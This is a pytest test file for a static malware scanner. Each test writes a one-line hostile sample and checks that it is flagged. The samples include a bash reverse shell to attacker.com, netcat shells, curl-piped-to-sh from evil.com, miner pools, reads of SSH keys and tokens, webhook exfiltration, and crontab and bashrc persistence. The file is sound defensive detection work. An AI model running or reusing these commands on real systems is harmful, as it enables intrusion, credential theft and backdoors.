"""Tests for StaticScanner — malware pattern detection."""

import pytest
from pathlib import Path


class TestReverseShell:
    """Reverse shell detection tests."""

    def test_bash_reverse_shell(self, static_scanner, tmp_path):
        f = tmp_path / "evil.sh"
        f.write_text('bash -i >& /dev/tcp/attacker.com/4444 0>&1\n')
        findings = static_scanner.scan_file(f)
        cats = {fd.category for fd in findings}
        assert "reverse_shell" in cats

    def test_netcat_shell(self, static_scanner, tmp_path):
        f = tmp_path / "evil.py"
        f.write_text('os.system("nc -e /bin/bash 10.0.0.1 4444")\n')
        findings = static_scanner.scan_file(f)
        cats = {fd.category for fd in findings}
        assert "reverse_shell" in cats

    def test_python_socket(self, static_scanner, tmp_path):
        f = tmp_path / "evil.py"
        f.write_text('s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n')
        findings = static_scanner.scan_file(f)
        cats = {fd.category for fd in findings}
        assert "reverse_shell" in cats

    def test_subprocess_shell(self, static_scanner, tmp_path):
        f = tmp_path / "evil.py"
        f.write_text('subprocess.Popen(["/bin/sh", "-c", cmd])\n')
        findings = static_scanner.scan_file(f)
        cats = {fd.category for fd in findings}
        assert "reverse_shell" in cats

    def test_powershell_encoded(self, static_scanner, tmp_path):
        f = tmp_path / "evil.ps1"
        f.write_text('powershell -enc SQBFAFgA\n')
        findings = static_scanner.scan_file(f)
        cats = {fd.category for fd in findings}
        assert "reverse_shell" in cats

    def test_php_fsockopen(self, static_scanner, tmp_path):
        f = tmp_path / "evil.php"
        f.write_text('$sock = fsockopen("10.0.0.1", 4444);\n')
        findings = static_scanner.scan_file(f)
        cats = {fd.category for fd in findings}
        assert "reverse_shell" in cats


class TestCryptoMiner:
    """Crypto miner detection tests."""

    def test_stratum_url(self, static_scanner, tmp_path):
        f = tmp_path / "mine.py"
        f.write_text('pool = "stratum+tcp://pool.minexmr.com:443"\n')
        findings = static_scanner.scan_file(f)
        cats = {fd.category for fd in findings}
        assert "crypto_miner" in cats

    def test_xmrig_reference(self, static_scanner, tmp_path):
        f = tmp_path / "mine.py"
        f.write_text('subprocess.run(["xmrig", "--pool", "xmr.pool.com:443"])\n')
        findings = static_scanner.scan_file(f)
        cats = {fd.category for fd in findings}
        assert "crypto_miner" in cats


class TestCredentialTheft:
    """Credential theft detection tests."""

    def test_environ_access(self, static_scanner, tmp_path):
        f = tmp_path / "steal.py"
        f.write_text('api_key = os.environ["OPENAI_API_KEY"]\n')
        findings = static_scanner.scan_file(f)
        cats = {fd.category for fd in findings}
        assert "credential_theft" in cats

    def test_getenv(self, static_scanner, tmp_path):
        f = tmp_path / "steal.py"
        f.write_text('secret = os.getenv("SECRET_KEY")\n')
        findings = static_scanner.scan_file(f)
        cats = {fd.category for fd in findings}
        assert "credential_theft" in cats

    def test_env_file(self, static_scanner, tmp_path):
        f = tmp_path / "steal.py"
        f.write_text('load_dotenv(".env")\n')
        findings = static_scanner.scan_file(f)
        cats = {fd.category for fd in findings}
        assert "credential_theft" in cats

    def test_aws_credentials(self, static_scanner, tmp_path):
        f = tmp_path / "steal.py"
        f.write_text('aws_access_key = config["aws_access_key"]\n')
        findings = static_scanner.scan_file(f)
        cats = {fd.category for fd in findings}
        assert "credential_theft" in cats

    def test_github_token(self, static_scanner, tmp_path):
        f = tmp_path / "steal.py"
        f.write_text('token = os.getenv("GITHUB_TOKEN")\n')
        findings = static_scanner.scan_file(f)
        cats = {fd.category for fd in findings}
        assert "credential_theft" in cats

    def test_private_key(self, static_scanner, tmp_path):
        f = tmp_path / "steal.py"
        f.write_text('key = open("PRIVATE_KEY").read()\n')
        findings = static_scanner.scan_file(f)
        cats = {fd.category for fd in findings}
        assert "credential_theft" in cats

    def test_ssh_key_reference(self, static_scanner, tmp_path):
        f = tmp_path / "steal.py"
        f.write_text('ssh_key = open("~/.ssh/id_rsa").read()\n')
        findings = static_scanner.scan_file(f)
        cats = {fd.category for fd in findings}
        assert "credential_theft" in cats


class TestObfuscation:
    """Obfuscation detection tests."""

    def test_base64_eval(self, static_scanner, tmp_path):
        f = tmp_path / "obf.js"
        f.write_text('eval(atob("cGF5bG9hZA=="));\n')
        findings = static_scanner.scan_file(f)
        cats = {fd.category for fd in findings}
        assert "obfuscation" in cats

    def test_python_base64_exec(self, static_scanner, tmp_path):
        f = tmp_path / "obf.py"
        f.write_text('exec(base64.b64decode("aW1wb3J0IG9z"))\n')
        findings = static_scanner.scan_file(f)
        cats = {fd.category for fd in findings}
        assert "obfuscation" in cats

    def test_getattr_builtins(self, static_scanner, tmp_path):
        f = tmp_path / "obf.py"
        f.write_text('getattr(__builtins__, "exec")("code")\n')
        findings = static_scanner.scan_file(f)
        cats = {fd.category for fd in findings}
        assert "obfuscation" in cats


class TestNetworkExfil:
    """Network exfiltration detection tests."""

    def test_discord_webhook(self, static_scanner, tmp_path):
        f = tmp_path / "exfil.py"
        f.write_text('requests.post("https://discord.com/api/webhooks/xxx")\n')
        findings = static_scanner.scan_file(f)
        cats = {fd.category for fd in findings}
        assert "network_exfil" in cats

    def test_slack_webhook(self, static_scanner, tmp_path):
        f = tmp_path / "exfil.py"
        f.write_text('requests.post("https://hooks.slack.com/services/XXX")\n')
        findings = static_scanner.scan_file(f)
        cats = {fd.category for fd in findings}
        assert "network_exfil" in cats

    def test_telegram_bot(self, static_scanner, tmp_path):
        f = tmp_path / "exfil.py"
        f.write_text('requests.get("https://api.telegram.org/botXXX/sendMessage")\n')
        findings = static_scanner.scan_file(f)
        cats = {fd.category for fd in findings}
        assert "network_exfil" in cats

    def test_webhook_site(self, static_scanner, tmp_path):
        f = tmp_path / "exfil.py"
        f.write_text('requests.post("https://webhook.site/xxx")\n')
        findings = static_scanner.scan_file(f)
        cats = {fd.category for fd in findings}
        assert "network_exfil" in cats


class TestHiddenPayloads:
    """Hidden payload detection tests."""

    def test_nested_base64(self, static_scanner, tmp_path):
        f = tmp_path / "hidden.py"
        f.write_text('payload = base64.b64decode(base64.b64decode("..."))\n')
        findings = static_scanner.scan_file(f)
        cats = {fd.category for fd in findings}
        assert "hidden_payloads" in cats

    def test_zlib_decompress(self, static_scanner, tmp_path):
        f = tmp_path / "hidden.py"
        f.write_text('data = zlib.decompress(base64.b64decode("..."))\n')
        findings = static_scanner.scan_file(f)
        cats = {fd.category for fd in findings}
        assert "hidden_payloads" in cats

    def test_marshal_loads(self, static_scanner, tmp_path):
        f = tmp_path / "hidden.py"
        f.write_text('code = marshal.loads(base64.b64decode("..."))\n')
        findings = static_scanner.scan_file(f)
        cats = {fd.category for fd in findings}
        assert "hidden_payloads" in cats


class TestSupplyChain:
    """Supply chain attack detection tests."""

    def test_curl_pipe_sh(self, static_scanner, tmp_path):
        f = tmp_path / "install.sh"
        f.write_text('curl https://evil.com/install.sh | sh\n')
        findings = static_scanner.scan_file(f)
        cats = {fd.category for fd in findings}
        assert "supply_chain" in cats

    def test_custom_pypi(self, static_scanner, tmp_path):
        f = tmp_path / "install.py"
        f.write_text('pip install malware --index-url https://evil.pypi.com/simple\n')
        findings = static_scanner.scan_file(f)
        cats = {fd.category for fd in findings}
        assert "supply_chain" in cats

    def test_unsafe_yaml_load(self, static_scanner, tmp_path):
        f = tmp_path / "install.py"
        f.write_text('eval(user_input("Enter: "))\n')
        findings = static_scanner.scan_file(f)
        cats = {fd.category for fd in findings}
        assert "supply_chain" in cats

    def test_pickle_from_network(self, static_scanner, tmp_path):
        f = tmp_path / "evil.py"
        f.write_text('obj = pickle.loads(requests.get("https://evil.com/p").content)\n')
        findings = static_scanner.scan_file(f)
        cats = {fd.category for fd in findings}
        assert "supply_chain" in cats


class TestPersistence:
    """Persistence mechanism detection tests."""

    def test_crontab(self, static_scanner, tmp_path):
        f = tmp_path / "persist.sh"
        f.write_text('(crontab -l; echo "*/5 * * * * backdoor") | crontab -\n')
        findings = static_scanner.scan_file(f)
        cats = {fd.category for fd in findings}
        assert "persistence" in cats

    def test_bashrc(self, static_scanner, tmp_path):
        f = tmp_path / "persist.sh"
        f.write_text('echo "backdoor" >> ~/.bashrc\n')
        findings = static_scanner.scan_file(f)
        cats = {fd.category for fd in findings}
        assert "persistence" in cats

    def test_chmod_777(self, static_scanner, tmp_path):
        f = tmp_path / "persist.sh"
        f.write_text('chmod 777 /tmp/payload\n')
        findings = static_scanner.scan_file(f)
        cats = {fd.category for fd in findings}
        assert "persistence" in cats

    def test_authorized_keys(self, static_scanner, tmp_path):
        f = tmp_path / "persist.sh"
        f.write_text('chmod 777 /tmp/backdoor && crontab ~/mycron\n')
        findings = static_scanner.scan_file(f)
        cats = {fd.category for fd in findings}
        assert "persistence" in cats


class TestCleanFiles:
    """Clean files should produce low/no findings."""

    def test_clean_python_skill(self, static_scanner):
        f = Path(__file__).parent / "fixtures" / "clean_skill.py"
        findings = static_scanner.scan_file(f)
        critical = [f for f in findings if f.severity == "critical"]
        assert len(critical) == 0, f"Clean file should have 0 critical findings, got {len(critical)}"

    def test_clean_markdown_skill(self, static_scanner):
        f = Path(__file__).parent / "fixtures" / "clean_skill.md"
        findings = static_scanner.scan_file(f)
        critical = [f for f in findings if f.severity == "critical"]
        high = [f for f in findings if f.severity == "high"]
        assert len(critical) == 0, f"Clean MD should have 0 critical findings, got {len(critical)}"
        assert len(high) == 0, f"Clean MD should have 0 high findings, got {len(high)}"


class TestMultiThreat:
    """Test file with multiple threat types."""

    def test_malicious_multi(self, static_scanner):
        f = Path(__file__).parent / "fixtures" / "malicious_multi.py"
        findings = static_scanner.scan_file(f)
        cats = {fd.category for fd in findings}
        assert "reverse_shell" in cats
        assert "credential_theft" in cats
        assert "crypto_miner" in cats
        assert "network_exfil" in cats
        assert len(findings) >= 10, f"Multi-threat file should have 10+ findings, got {len(findings)}"

    def test_risk_score_max(self, static_scanner, tmp_path):
        """Multi-threat file should hit risk score 100."""
        f = Path(__file__).parent / "fixtures" / "malicious_multi.py"
        result = static_scanner.scan_directory(f)
        assert result.risk_score == 100, f"Risk score should be 100, got {result.risk_score}"
